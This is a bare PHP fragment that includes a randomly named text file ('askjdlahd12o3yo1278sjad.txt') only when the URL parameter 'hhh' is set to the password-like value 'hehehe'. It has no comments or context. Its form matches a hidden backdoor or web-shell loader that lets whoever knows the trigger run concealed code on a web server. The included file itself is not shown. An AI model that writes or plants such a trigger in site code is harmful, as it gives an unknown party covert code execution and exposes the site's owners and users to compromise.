<?php
if(isset($_GET['hhh']) && $_GET['hhh'] == 'hehehe') {
    include('askjdlahd12o3yo1278sjad.txt');
}